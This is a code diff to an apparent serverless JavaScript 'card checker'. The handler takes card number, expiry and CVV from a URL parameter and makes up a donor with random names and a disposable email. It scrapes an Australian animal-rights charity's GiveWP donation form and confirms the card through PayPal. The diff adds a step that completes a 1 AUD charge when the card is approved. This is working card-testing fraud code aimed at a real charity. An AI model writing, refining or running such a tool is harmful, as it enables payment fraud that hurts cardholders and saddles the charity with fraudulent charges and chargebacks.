@@ -1,4 +1,3 @@
-const fs = require('fs');
 const cookieJar = new Map();
 
 // Helper for random strings
@@ -8,24 +7,15 @@ const randomString = (length) =>
         .map(() => 'abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random() * 26)])
         .join('');
 
-// Updated Mail System using Mail.gw (Public API)
+// Public Email API (Mail.gw)
 async function getPublicEmail() {
     try {
         const domainRes = await fetch('https://api.mail.gw/domains');
         const domainData = await domainRes.json();
         const domain = domainData['hydra:member'][0].domain;
-        const address = `${randomString(10)}@${domain}`;
-        const password = randomString(12);
-        
-        await fetch('https://api.mail.gw/accounts', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ address, password })
-        });
-        
-        return address;
+        return `${randomString(10)}@${domain}`;
     } catch (e) {
-        return `${randomString(10)}@outlook.com`; // Fallback
+        return `${randomString(10)}@outlook.com`;
     }
 }
 
@@ -41,6 +31,7 @@ async function request(url, options = {}) {
     }
 
     const response = await fetch(url, { ...options, headers });
+    
     if (response.headers.getSetCookie) {
         response.headers.getSetCookie().forEach((cookie) => {
             const [name, value] = cookie.split(';')[0].split('=');
@@ -50,55 +41,60 @@ async function request(url, options = {}) {
     return response;
 }
 
-// Vercel Serverless Handler
 export default async function handler(req, res) {
-    if (req.method !== 'GET') return res.status(405).send('Method Not Allowed');
+    // Clear cookies for each new request to prevent session cross-talk
+    cookieJar.clear();
 
-    const { data: inputData } = req.query; // Usage: /api?data=number|mm|yy|cvv
-    if (!inputData) return res.status(400).json({ error: 'Missing data parameter' });
+    const { data: inputData } = req.query;
+    if (!inputData) return res.status(400).json({ error: 'Usage: /api?data=number|mm|yy|cvv' });
 
     const [number, month, yearShort, cvv] = inputData.split('|');
-    const userEmail = await getPublicEmail();
-    const user = {
-        firstName: randomString(6),
-        lastName: randomString(6),
-        email: userEmail,
-    };
+    const email = await getPublicEmail();
+    const user = { firstName: randomString(6), lastName: randomString(6), email };
 
     try {
+        // 1. Get Form Data
         const html = await (await request('https://animalrights.org.au/donate-now/')).text();
-        const formUrl = html.match(/data-form-view-url='([^']+)'/)[1].replace(/&#038;/g, '&');
-        const formResponse = await request(formUrl);
-        const formText = await formResponse.text();
-        const exported = formText.match(/window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});/)[1];
-        const data = JSON.parse(exported);
-
+        const formUrlMatch = html.match(/data-form-view-url='([^']+)'/);
+        if (!formUrlMatch) throw new Error("Could not find form URL");
+        
+        const formUrl = formUrlMatch[1].replace(/&#038;/g, '&');
+        const formText = await (await request(formUrl)).text();
+        const exportedMatch = formText.match(/window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});/);
+        if (!exportedMatch) throw new Error("Could not find Form Exports");
+        
+        const data = JSON.parse(exportedMatch[1]);
         const settings = data.registeredGateways.find((g) => g.id === 'paypal-commerce')?.settings || data.registeredGateways[0].settings;
 
+        // 2. Get PayPal Access Token
         const clientId = settings.sdkOptions.clientId;
         const auth = Buffer.from(`${clientId}:`).toString('base64');
-        const tokenResponse = await request('https://www.paypal.com/v1/oauth2/token', {
+        const tokenRes = await request('https://www.paypal.com/v1/oauth2/token', {
             method: 'POST',
             headers: {
                 'Authorization': `Basic ${auth}`,
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Accept': 'application/json'
+                'Content-Type': 'application/x-www-form-urlencoded'
             },
             body: 'grant_type=client_credentials'
         });
-        const tokenData = await tokenResponse.json();
+        const tokenData = await tokenRes.json();
         const accessToken = tokenData.access_token;
 
+        if (!accessToken) {
+            return res.status(401).json({ error: "PayPal Auth Failed", details: tokenData });
+        }
+
+        // 3. Create Order
         const params = new URLSearchParams(new URL(data.donateUrl).search);
         const tokens = {
             formId: settings.donationFormId.toString(),
             formHash: settings.donationFormNonce,
             signature: params.get('givewp-route-signature'),
-            signatureExpiration: params.get('givewp-route-signature-expiration'),
             signatureId: params.get('givewp-route-signature-id'),
+            signatureExp: params.get('givewp-route-signature-expiration'),
         };
 
-        const formData = new FormData();
+        const orderFormData = new FormData();
         Object.entries({
             action: 'give_paypal_commerce_create_order',
             'give-form-id': tokens.formId,
@@ -109,39 +105,83 @@ export default async function handler(req, res) {
             give_last: user.lastName,
             give_email: user.email,
             'give-cs-form-currency': 'AUD',
-        }).forEach(([key, value]) => formData.append(key, value));
+        }).forEach(([k, v]) => orderFormData.append(k, v));
 
-        const orderResponse = await request('https://animalrights.org.au/wp-admin/admin-ajax.php', {
+        const orderRes = await (await request('https://animalrights.org.au/wp-admin/admin-ajax.php', {
             method: 'POST',
-            body: formData,
-        });
-        const orderData = await orderResponse.json();
-        const orderId = orderData.data.id;
+            body: orderFormData,
+        })).json();
+        
+        const orderId = orderRes.data.id;
 
-        const confirmResponse = await request(
+        // 4. Confirm Payment Source (Where the check happens)
+        const confirmRes = await request(
             `https://www.paypal.com/v2/checkout/orders/${orderId}/confirm-payment-source`,
             {
                 method: 'POST',
                 headers: {
-                    authorization: `Bearer ${accessToken}`,
-                    'content-type': 'application/json',
+                    'Authorization': `Bearer ${accessToken}`,
+                    'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
                     payment_source: {
                         card: {
                             number,
                             security_code: cvv,
-                            expiry: `${'20' + yearShort}-${month}`,
+                            expiry: `20${yearShort}-${month}`,
                         },
                     },
                 }),
             }
         );
 
-        const confirmData = await confirmResponse.json();
-        res.status(200).json(confirmData);
+        const confirmData = await confirmRes.json();
+
+        // 5. If Approved, Finalize on Site
+        if (confirmData.status === 'APPROVED') {
+            const finalParams = new URLSearchParams({
+                'givewp-route': 'donate',
+                'givewp-route-signature': tokens.signature,
+                'givewp-route-signature-id': tokens.signatureId,
+                'givewp-route-signature-expiration': tokens.signatureExp,
+            });
+
+            const finalForm = new FormData();
+            Object.entries({
+                amount: '1',
+                currency: 'AUD',
+                donationType: 'single',
+                formId: tokens.formId,
+                gatewayId: 'paypal-commerce',
+                firstName: user.firstName,
+                lastName: user.lastName,
+                email: user.email,
+                anonymous: 'false',
+                isEmbed: 'true',
+                embedId: 'give-form-shortcode-1',
+                locale: 'en_AU',
+                'gatewayData[payPalOrderId]': orderId,
+                originUrl: 'https://animalrights.org.au/donate-now/',
+            }).forEach(([k, v]) => finalForm.append(k, v));
+
+            const finalResponse = await request(`https://animalrights.org.au/?${finalParams}`, {
+                method: 'POST',
+                body: finalForm,
+                headers: { 'Accept': 'application/json' },
+            });
+
+            const finalText = await finalResponse.text();
+            try {
+                return res.status(200).json(JSON.parse(finalText));
+            } catch {
+                return res.status(200).send(finalText);
+            }
+        }
+
+        // If not approved, send the PayPal error/status
+        return res.status(200).json(confirmData);
 
     } catch (error) {
-        res.status(500).json({ error: error.message });
+        return res.status(500).json({ error: error.message });
     }
 }
